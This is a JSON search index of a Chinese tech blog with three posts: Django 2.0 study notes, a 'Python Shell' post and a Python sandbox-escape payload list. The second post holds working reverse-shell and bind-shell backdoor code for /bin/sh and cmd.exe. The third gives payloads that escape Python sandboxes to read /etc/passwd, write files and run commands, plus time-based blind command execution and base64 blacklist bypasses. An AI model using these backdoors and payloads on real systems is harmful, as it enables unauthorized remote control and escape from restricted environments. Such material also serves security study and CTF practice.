[{"title":"Django2.0 学习记录","url":"/2018/11/23/Django2-0-学习记录/","content":"\n## Django2.0学习记录\n\n### 基本使用\n```\n安装\npip install Django\n\n创建一个新的项目和应用\nDjango-admin startproject cms  // 项目\ncd cms\npython manage.py startapp we  //应用\n\n创建数据库并同步\npython manage.py makemigrations web  //创建数据库\npython manage.py migrate  //同步数据库\n\n创建超级用户\npython manage.py createsuperuser\n\n交互式shell\npython manage.py shell\n```\n\n### setting模块\n设置中文字体\n```\nLANGUAGE_CODE = 'zh_Hans'\nTIME_ZONE = 'Asia/Shanghai'\n```\n\n设置模版路径\n```\nTEMPLATES = [\n    {\n        ...\n        'DIRS': [os.path.join(BASE_DIR, 'templates')],\n        ...\n    },\n]\n```\n\n加载静态文件\n```\nSTATIC_URL = '/static/'\n\nSTATICFILES_DIRS = (\n    os.path.join(BASE_DIR, \"static\"),\n)\n```\n\n### model模块\n```\n表关系\n\n一对多，models.ForeignKey(ColorDic)\n一对一，models.OneToOneField(OneModel)\n多对多，authors = models.ManyToManyField(Author)\n\nField\nPositiveIntegerField  #正整数字段\n\n查看数据库结构\npython manage.py sqlmigrate polls 0001\n\non_delete(表关系)\n\non_delete=models.CASCADE级联删除\n当删除主表的数据时候从表中的数据也随着一起删除\n\nauto_now_add(DateTime)\n\nauto_now_add为添加时的时间，更新对象时不会有变动\n\nobjects.all()\n\nall返回的是QuerySet对象，程序并没有真的在数据库中执行SQL语句查询数据，但支持迭代，使用for循环可以获取数据\n\nobjects.get()与objects.filter()二者类似\n\nget返回的是Model对象，类型为列表，说明使用get方法会直接执行sql语句获取数据\n\n用于类型转换，将object的类型转换为可读的str型\ndef __str__(self): \n    return self.name\n\n显示中文名称\nclass Mate:\n    verbose_name = '标签'\n    verbose_name_plural = '标签'\n```\n\n### urls模块\n```\n<int:question_id>\n\npath('<int:question_id>/', views.detail, name='detail')\n<int:是一个转换器，用于确定哪些模式应与URL路径的这一部分匹配\n:question_id>定义将用于标识匹配模式的名称\n```\n\n### admin模块\n```\n显示内容更多属性\nclass PostAdmin(admin.ModelAdmin):\n    list_display = ['title', 'created_time', 'modified_time', 'category', 'author']\nadmin.site.register(Post,PostAdmin)\n```\n\n### view模块\n```\nmarkdown渲染\n\npip install markdwon\n\nimport markdown\n\ndef detail(request, pk):\n    post = get_object_or_404(Post, pk=pk)\n    post.body = markdown.markdown(post.body,\n                                  extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                  ])\n    return render(request, 'blog/detail.html', context={'post': post})\n```\n","tags":["django","python"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n### windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n### linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]},{"title":"Python 沙箱逃逸payload","url":"/2018/09/20/Python-沙箱逃逸payload/","content":"\n1. (type 'file')   读文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"/etc/passwd\").read()\n```\n2. (type 'file')   写文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"123.txt\",'w').write('asdfqwer')\n```\n\n3. (class 'warnings.catch_warnings')  命令执行\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()')\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')\n```\n4. timeit\n这个库主要是用来计时用的，用来计算函数的完成时间，后面的number=1表示函数只运行一次\n    提到timeit就由涉及到time based rce，这点跟mysq的时间延时注入很像，通过比对返回时间来获取文件内容\n    这里先来讲shell语句\n    if [ 1=1 ]; then sleep 2;fi;\n    if [ 1=2 ];then sleep 2 ;fi;\n    这里其实跟时间盲注是一个道理，，判断字符串然后返回时间，通过返回时间来进行比对，最终获取字符串\n\n```\n>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = y ];then sleep 2;fi;')\", number = 1)\n2.016458034515381\n>>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = q ];then sleep 2;fi;')\", number = 1)\n0.009487152099609375\n```\n5. platform\n这个库主要是用来识别系统什么的，这里其实最重要的是引入了popen来执行命令，因此也可用作命令执行\n\n```\nimport platform\nplatform.popen('ls').read()\n```\n6. 黑名单绕过\ndict 拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')\n```\nbase64拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('ls')\n```","tags":["python"]}]